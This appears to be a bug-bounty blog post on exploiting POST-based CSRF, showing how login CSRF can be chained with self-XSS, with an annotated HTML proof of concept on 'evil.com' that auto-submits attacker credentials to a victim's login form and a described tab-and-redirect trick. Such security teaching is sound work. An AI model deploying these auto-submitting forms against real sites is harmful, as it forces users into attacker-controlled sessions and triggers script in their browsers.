---
layout: post
title: Exploiting POST-Based CSRF
---

This article will explore a variety of methods to identify, chain and exploit POST-Based CSRF to maximize the severity of your findings.

## What Is POST-Based CSRF?

POST-Based CSRF, as opposed to GET-Based CSRF, is a type of CSRF which affects POST requests. These, unlike GET requests, contain a body which means they cannot be exploited simply using an image. Instead, one must create a specially crafted page in order to execute the CSRF. This is where a lot of newer hackers fail, as they are not aware that this is possible, so it's something that's very important to be familiar with!

## The Login CSRF Mistake

Logout CSRF is not accepted as a valid submission in a lot of bounty programs, and for a very good reason. However, a lot of bounty programs mistakingly inlude login CSRF under the same umbrella. While the severity of login CSRF is generally pretty low, it can be easily used in a chain attack to convert self XSS into stored XSS. Imagine a scenario where you identify self XSS on `victim.com`, another vulnerability which is usually out of scope due to the unlikely user interaction required to execute a payload (self XSS, generally speaking, will require the user themselves to insert the payload, arguments have been made that users could be convinced into doing so, but naturally users could be convinced to insert payloads into their browser console all the same, which would have the same desired effect). So these are 2 vulnerabilities which are "worthless" according to the majority of vulnerability disclosure programs. You find this self XSS on `somerandompage.php` and notice there is no CSRF token, or other anti-CSRF measure, on the login form (`login.php`). Firstly, you must register an account on the website (we'll create an account called `user` with the password `pass`) and next, you should insert the payload on `somerandompage.php`. Now whenever YOU visit that page, the code will execute. In fact, whenever anyone at all who is logged into your account sees that page, they too will execute the payload. Next, we must create a page exploiting the login CSRF in order to automatically log your victim in. You then create your own website `evil.com` and include the following PoC source code:

``
<!-- This is a HTML comment -->

<!-- Create a form pointing to the login page using the POST protocol -->
<form action="https://victim.com/login.php" method="POST">
<!-- Automatically fill the username -->
<input name="username" value="user">
<!-- Automatially fill the password -->
<input name="password" value="pass">
<!-- Create a login button with ID btn -->
<input type="submit" id="btn">
<!- Close the form -->
</form>

<!-- Now we must automatically execute the form when a user visits our site, using javascript -->
<script>
//This is a javascript comment
//Simply click the button with ID btn
document.getElementById("btn").click();
//End of script
</script>
<!-- Whenever a user visits this page, they will automatically login to your account -->
``

So that's cool and all, but we still haven't actually got the user to visit `somerandompage.php` to execute the payload. It seems as though they must automatically visit this, or we have to yet again convince them to click another link, which of course would decrease the severity. This is not the case though! I've been experimenting with this recently, to improve the impact of some similar vulnerabilities I've discovered and have been creating a second page on the website `evil.com` and automatically opening it up in a new tab once a user visits the first page, and then waiting some time (using javascript) before redirecting to `somerandompage.php` should work. There are multiple solutions for this, but it feels elegant to wait a few seconds (while the POST request executes) before doing a redirect. This should then redirect them to the page (using the cookies they now have) and execute the payload.
